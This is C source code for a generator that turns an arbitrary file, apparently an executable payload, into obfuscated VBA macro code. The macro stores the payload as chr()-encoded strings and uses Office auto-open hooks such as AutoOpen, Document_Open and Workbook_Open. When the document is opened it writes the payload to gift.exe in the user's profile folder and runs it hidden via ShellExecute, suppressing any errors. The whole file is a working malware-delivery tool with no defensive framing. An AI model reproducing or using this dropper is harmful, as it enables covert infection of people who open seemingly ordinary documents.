#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define NLINESPERFUNC 135
#define LBUFF         94
#define NCHARSPERLINE 8
#define NFUNCPERLINE  80
#define HEADERA "Const SW_HIDE = 0\n"\
                "Const SW_SHOW = 1\n"\
                "Const SH_SHOWMINIMIZED = 2\n"\
                "Const SH_SHOWMAXIMIZED = 3\n"\
                "\n"\
                "#If VBA7 Then\n"\
                "  Private Declare PtrSafe Function ShellExecute Lib \"Shell32.dll\" Alias \"ShellExecuteA\" _\n"\
                "    (ByVal hwnd As Long,ByVal lpOperation As String,ByVal lpFile As String,ByVal lpParameters As String,ByVal lpDirectory As String,ByVal nShowCmd As Long) As Long\n"\
                "#Else\n"\
                "  Private Declare Function ShellExecute Lib \"Shell32.dll\" Alias \"ShellExecuteA\" _\n"\
                "    (ByVal hwnd As Long,ByVal lpOperation As String,ByVal lpFile As String,ByVal lpParameters As String,ByVal lpDirectory As String,ByVal nShowCmd As Long) As Long\n"\
                "#End If\n"\
                "\n"\
                "Public Sub AutoExec()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"\
                "Public Sub Auto_Exec()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"\
                "Public Sub AutoOpen()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"\
                "Public Sub Auto_Open()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"\
                "Public Sub Document_Open()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"\
                "Private Sub Workbook_Open()\n"\
                "dropgift\n"\
                "End Sub\n"\
                "\n"
#define FUNC1   "Function A"
#define FUNC3   "() as String\n"
#define FUNC4   "s = chr("
#define FUNC5   ") + chr("
#define FUNC7   ")\n"
#define FUNC8   "s = s + chr("
#define FUNC9   "A"
#define FUNC11  " = s\nEnd Function\n\n"
#define DROPFUNCA   "Sub dropgift()\ns = A"
#define DROPFUNCB   "() + A"
#define DROPFUNCC   "()\n"
#define DROPFUNCEND "\nOn Error Resume Next\n"\
                    "outfile = Environ(\"USERPROFILE\") + \"\\gift.exe\"\n"\
                    "Open outfile For Output As #1\n"\
                    "Print #1, s\n"\
                    "Close #1\n"\
                    "runagent\n"\
                    "End Sub\n\n"
#define RUNAGENT    "Sub runagent()\n"\
                    "Dim RetVal As Long\n"\
                    "On Error Resume Next\n"\
                    "outfile = \"gift.exe\"\n"\
                    "RetVal = ShellExecute(0, \"open\", outfile, \"\", _\n"\
                    "Environ(\"USERPROFILE\"), SW_HIDE)\n"\
                    "End Sub\n"

void usage(char *);
int fSize(char *);

int main(int argc, char *argv[])
{
  char headerA[] =  HEADERA, lBuff[LBUFF];
  char funcBeginA[] = FUNC1, funcBeginB[] = FUNC3, funcBeginC[] = FUNC4, funcMiddleA[] = FUNC8, funcMiddleB[] = FUNC5, funcMiddleC[] = FUNC7, funcEndA[] = FUNC9, funcEndB[] = FUNC11;
  char funcDropA[] = DROPFUNCA, funcDropB[] = DROPFUNCB, funcDropC[] = DROPFUNCC, funcDropEnd[] = DROPFUNCEND;
  char funcRunAgend[] = RUNAGENT;
  FILE *fpInput = NULL;
  unsigned int c, i, fs = 0, cFs = 0, nFunc = 0, lPerFunc = 0, cPerLine = 0, finishedFile = 0;
  int outFd = 1;

  if(argc == 1)
  {
    usage(argv[0]);
    exit(-1);
  }
  
  write(outFd, headerA, sizeof(headerA)); // HEADER
  fs = fSize(argv[1]);
//  printf("Size: %d\n", fs);

  nFunc = fs / 1080; // 1080 - Number of bytes per function.
  if ((fs % 1080) > 0 )
    nFunc++;

  fpInput = fopen(argv[1], "r");
  if(fpInput == NULL)
  {
    perror("Error in fopen():");
    exit(-1);
  }

//  printf("nFunc: %d\n", nFunc);   // DEBUG DEBUG DEBUG

  while(1)
  {
    i = 0;
    if(nFunc == 0) // Empty file.
      break;

    while(i < nFunc) // Create the functions into the File
    { 
      write(outFd, funcBeginA, sizeof(funcBeginA));
      fflush(stdout);
      printf("%d", i);
      fflush(stdout);
      write(outFd, funcBeginB, sizeof(funcBeginB));
      for(lPerFunc = 0; lPerFunc < NLINESPERFUNC; lPerFunc++) // Create the lines into the Function
      {
        if(lPerFunc == 0)
          write(outFd, funcBeginC, sizeof(funcBeginC));
        else
          write(outFd, funcMiddleA, sizeof(funcMiddleA));

        for(cPerLine = 0; cPerLine < NCHARSPERLINE; cPerLine++) // Create the chars into the Lines
        {
          c = fgetc(fpInput);

          if(c == EOF)
          {
            write(outFd, funcMiddleC, sizeof(funcMiddleC));
            finishedFile = 1;
            break;
          }
          cFs++;
          fflush(stdout);
          printf("%d", c);
          fflush(stdout);
          
          if(cPerLine == 7 || cFs == fs)
            write(outFd, funcMiddleC, sizeof(funcMiddleC));
          else
            write(outFd, funcMiddleB, sizeof(funcMiddleB));

          if(cFs == fs)
          {
            finishedFile = 1;
            break;
          }
        }
        if(finishedFile == 1)
          break;
      }
      write(outFd, funcEndA, sizeof(funcEndA));
      fflush(stdout);
      printf("%d", i);
      fflush(stdout);
      write(outFd, funcEndB, sizeof(funcEndB));
      i++;
      if(finishedFile == 1)
        break;
    }
    if (finishedFile == 1)
      break;
  }

  finishedFile = 0;
  write(outFd, funcDropA, sizeof(funcDropA));
  i = 0;
  while(i < nFunc)
  {
    for(c = 0; c < NFUNCPERLINE; c++)
    {
      fflush(stdout);
      printf("%d", i);
      fflush(stdout);
      if(c == (NFUNCPERLINE - 1) || i == (nFunc - 2))
        write(outFd, funcDropC, sizeof(funcDropC));
      else
          write(outFd, funcDropB, sizeof(funcDropB));
      i++;
      
      if(i == (nFunc - 1))
      {
        finishedFile = 1;
        break;
      }
    }
    if(finishedFile == 1)
      break;
  }
  write(outFd, funcDropEnd, sizeof(funcDropEnd));
  write(outFd, funcRunAgend, sizeof(funcRunAgend));

  return 0;
}

void usage(char *progname)
{
  printf("Usage: %s <options>\n", progname);
}

int fSize(char *fname)
{
  struct stat stFile;
  
  if (stat(fname, &stFile) == 0)
    return stFile.st_size;

  return -1;
}
